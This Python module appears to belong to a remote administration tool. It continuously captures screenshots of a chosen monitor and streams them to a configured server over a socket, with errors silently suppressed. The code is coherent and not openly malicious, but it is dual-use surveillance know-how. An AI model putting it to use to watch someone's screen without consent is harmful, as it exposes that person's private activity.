'''
    Creates a connection to the server, sending a stream
    of screenshots from the specified monitor. Splitting
    up the work in to two threads, one for taking the
    screenshot, the other to send it.

    Verified: 2021 February 6
    * Follows PEP8
    * Tested Platforms
        * Windows 10
    * Third Party Modules
        * mss
'''

from client.modules.module import Module
from shared.helper import Helper
from shared.state import Static
from shared.error import Error
from shared.data import Data

import mss.tools
import socket
import queue
import mss

if Static.WINDOWS:
    import ctypes

    # NOTE : Sets monitor DPI (zoom) to 100%,
    # laptops usually have their DPI set to 125%,
    # by default which this line will fix
    Error.quiet(
        ctypes.windll.user32.SetProcessDPIAware)()


class Desktop(Module):

    __MAX_SIZE = 1

    def __init__(self, token):
        super().__init__(token)
        self.__queue = queue.Queue(Desktop.__MAX_SIZE)

    @Error.quiet_thread
    def __grab(self, monitor):
        with mss.mss() as sct:
            size = sct.monitors[monitor]

            while True:
                screenshot = sct.grab(size)
                screenshot = mss.tools.to_png(screenshot.rgb,
                                              screenshot.size)
                self.__queue.put(screenshot,
                                 timeout=Static.LIVE_TIMEOUT)

    @Error.quiet_thread
    def __send(self):
        with socket.create_connection(
                (Static.IP, Static.PORT)) as sock:
            Data.send(sock, self.token)
            Data.recv(sock)

            while True:
                Data.send(sock, self.__queue.get(
                          timeout=Static.LIVE_TIMEOUT), False)
                Data.recv(sock)

    def live(self, monitor):
        Helper.thread(self.__send)
        Helper.thread(self.__grab, monitor)
